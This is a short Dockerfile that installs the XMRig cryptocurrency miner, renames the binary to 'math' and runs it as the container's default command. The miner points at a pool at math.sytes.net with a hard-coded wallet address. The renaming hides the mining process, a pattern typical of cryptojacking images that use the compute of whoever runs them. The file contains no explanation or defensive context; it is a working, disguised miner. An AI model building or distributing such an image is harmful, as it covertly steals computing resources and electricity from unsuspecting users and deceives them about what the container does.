FROM ubuntu:20.04

LABEL maintainer="Roman Nikov"

RUN apt update; \
    apt install -y wget; \
    wget https://github.com/xmrig/xmrig/releases/download/v6.16.2/xmrig-6.16.2-focal-x64.tar.gz; \
    tar xf xmrig-6.16.2-focal-x64.tar.gz; \
    cd xmrig-6.16.2; \
    cp xmrig /usr/local/bin/xmrig; \
    cd /usr/local/bin; \
    mv xmrig math;

WORKDIR /usr/local/bin

RUN chmod 777 math;

CMD math -a gr -o math.sytes.net:5555 --tls -u RUpj92cvanvWbdTQtC6Fw39cHpU12o4S6R
